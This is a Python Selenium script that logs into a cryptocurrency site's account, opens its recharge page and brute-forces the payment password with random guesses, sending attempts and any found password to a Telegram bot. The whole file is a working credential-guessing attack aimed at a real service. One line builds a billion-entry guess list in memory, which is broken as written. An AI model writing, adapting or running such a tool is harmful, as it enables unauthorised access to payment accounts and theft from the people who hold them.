import os
import time
import random
import string
import telebot
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

# Telegram Setup
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
bot = telebot.TeleBot(BOT_TOKEN)

initial_password = "Btc658"

def generate_password(length=6):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def send_log(message):
    try:
        bot.send_message(CHAT_ID, message)
    except Exception as e:
        print("Telegram Error:", e)

def start_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.binary_location = "/usr/bin/google-chrome"
    return webdriver.Chrome(options=chrome_options)

def main():
    driver = start_driver()
    try:
        driver.get("https://www.btc320.com/pages/user/other/userLogin")
        time.sleep(5)

        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("USERNAME"))
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[5]/uni-view[1]/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("PASSWORD"))
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[6]/uni-button').click()
        time.sleep(6)
        send_log("✅ Logged in successfully.")

        driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
        time.sleep(6)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")

        passwords = [initial_password] + [generate_password(random.randint(4, 10)) for _ in range(1000000000)]

        wrong_log = []
        max_log_size = 25
        attempt_count = 0
        start_time = time.time()

        for pwd in passwords:
            attempt_count += 1
            try:
                input_box = driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view/uni-view[9]/uni-view/uni-view/uni-input/div/input')
                input_box.clear()
                input_box.send_keys(pwd)
                driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view/uni-button').click()
                time.sleep(5)

                current_url = driver.current_url
                if "rechargePay?sn=" in current_url:
                    send_log(f"✅ Password correct: {pwd}\nURL: {current_url}")
                    send_log(f"✅ Found in {attempt_count} attempts. Time: {time.time() - start_time:.2f} seconds")
                    break  # stop trying

                wrong_log.append(pwd)

                if len(wrong_log) >= max_log_size:
                    send_log("❌ Wrong passwords:\n" + "\n".join(wrong_log))
                    wrong_log = []
                    time.sleep(1.5)  # avoid telegram flood

            except Exception as e:
                send_log(f"⚠️ Error while testing password '{pwd}': {e}")
                time.sleep(1)

        # Final batch if any
        if wrong_log:
            send_log("❌ Final wrongs:\n" + "\n".join(wrong_log))

        send_log(f"❌ Password not found. Total attempts: {attempt_count}")

    except Exception as e:
        send_log(f"🔥 Bot crashed: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    send_log("🚀 Bot started")
    main()
